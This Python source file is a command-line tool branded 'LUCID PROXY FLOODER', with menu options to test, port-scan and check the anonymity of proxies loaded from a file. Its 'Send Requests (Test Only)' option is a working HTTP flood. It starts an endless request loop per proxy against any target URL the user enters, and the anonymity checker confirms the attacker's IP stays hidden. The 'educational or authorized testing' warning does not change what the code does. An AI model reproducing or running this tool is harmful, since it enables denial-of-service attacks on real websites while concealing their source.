import threading
import requests
import time
from rich.console import Console
from rich.panel import Panel
from rich import print
import inquirer
from tqdm import tqdm
import concurrent.futures
import socket
import os

os.system('cls' if os.name == 'nt' else 'clear')

console = Console()

ASCII_ART = r"""
 _      _            _     ____                       
| |    (_)          | |   |  _ \                      
| |     _ _ __   ___| |_  | |_) |_   _ _ __ ___  ___  
| |    | | '_ \ / __| __| |  _ <| | | | '__/ _ \/ _ \ 
| |____| | | | | (__| |_  | |_) | |_| | | |  __/  __/ 
|______|_|_| |_|\___|\__| |____/ \__,_|_|  \___|\___| 

            ~ LUCID PROXY FLOODER ~
"""

def print_ascii():
    console.print(Panel(ASCII_ART, title="[bold green]Welcome[/bold green]", subtitle="by Lucid Spider"))
    console.print("[bold red]WARNING:[/bold red] Use this tool only for educational or authorized testing purposes.\n")

def load_proxies():
    with open('proxys.txt', 'r') as f:
        proxies = [line.strip() for line in f]
    return proxies

def save_log(filename, data):
    with open(filename, 'a') as f:
        f.write(data + '\n')

def test_proxy(proxy):
    try:
        session = requests.Session()
        session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        response = session.get("http://httpbin.org/ip", timeout=5)
        result = f"[{proxy}] OK → {response.json()}"
        console.print(f"[{proxy}] [green]OK[/green] → {response.json()}")
    except Exception as e:
        result = f"[{proxy}] FAIL → {e}"
        console.print(f"[{proxy}] [red]FAIL[/red] → {e}")
    save_log('test_results.txt', result)

def send_requests(proxies, target_url):
    def attack(proxy):
        session = requests.Session()
        session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        while True:
            try:
                response = session.get(target_url, timeout=5)
                console.print(f"[{proxy}] Status: {response.status_code}")
            except Exception as e:
                console.print(f"[{proxy}] Error: {e}")

    for proxy in proxies:
        t = threading.Thread(target=attack, args=(proxy,))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("[bold red]Interrupted by user[/bold red]")

def scan_proxy(proxy):
    ip, port = proxy.split(':')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((ip, int(port)))
    if result == 0:
        msg = f"[{proxy}] Port open"
        console.print(f"[{proxy}] [green]Port open[/green]")
    else:
        msg = f"[{proxy}] Port closed"
        console.print(f"[{proxy}] [red]Port closed[/red]")
    sock.close()
    save_log('scan_results.txt', msg)

def validate_proxy(proxy, my_ip):
    try:
        session = requests.Session()
        session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        response = session.get("http://httpbin.org/ip", timeout=5)
        proxy_ip = response.json()['origin']
        if proxy_ip != my_ip:
            msg = f"[{proxy}] Anonymous → {proxy_ip}"
            console.print(f"[{proxy}] [green]Anonymous[/green] → {proxy_ip}")
        else:
            msg = f"[{proxy}] Did not hide your IP!"
            console.print(f"[{proxy}] [red]Did not hide your IP![/red]")
    except Exception as e:
        msg = f"[{proxy}] Error: {e}"
        console.print(f"[{proxy}] [red]Error:[/red] {e}")
    save_log('validate_results.txt', msg)

def main():
    print_ascii()
    options = [
        ('Test Proxies', 'test'),
        ('Send Requests (Test Only)', 'send'),
        ('Scan Proxies (Open Port)', 'scan'),
        ('Validate Anonymity', 'validate'),
        ('Exit', 'exit')
    ]

    while True:
        questions = [
            inquirer.List('choice', message="Choose an option", choices=[x[0] for x in options])
        ]
        answer = inquirer.prompt(questions)
        choice = [x[1] for x in options if x[0] == answer['choice']][0]

        if choice == 'exit':
            console.print("[bold yellow]Exiting...[/bold yellow]")
            break

        proxies = load_proxies()

        if choice == 'test':
            console.print("[bold cyan]Testing proxies...[/bold cyan]")
            with concurrent.futures.ThreadPoolExecutor() as executor:
                list(tqdm(executor.map(test_proxy, proxies), total=len(proxies)))
                
        elif choice == 'send':
            target_url = input("Enter target URL: ")
            send_requests(proxies, target_url)

        elif choice == 'scan':
            console.print("[bold magenta]Scanning proxies...[/bold magenta]")
            with concurrent.futures.ThreadPoolExecutor() as executor:
                list(tqdm(executor.map(scan_proxy, proxies), total=len(proxies)))

        elif choice == 'validate':
            console.print("[bold blue]Validating anonymity...[/bold blue]")
            my_ip = requests.get("http://httpbin.org/ip").json()['origin']
            console.print(f"[bold]Your real IP:[/bold] {my_ip}")
            with concurrent.futures.ThreadPoolExecutor() as executor:
                list(tqdm(executor.map(validate_proxy, proxies, [my_ip]*len(proxies)), total=len(proxies)))

if __name__ == "__main__":
    main()
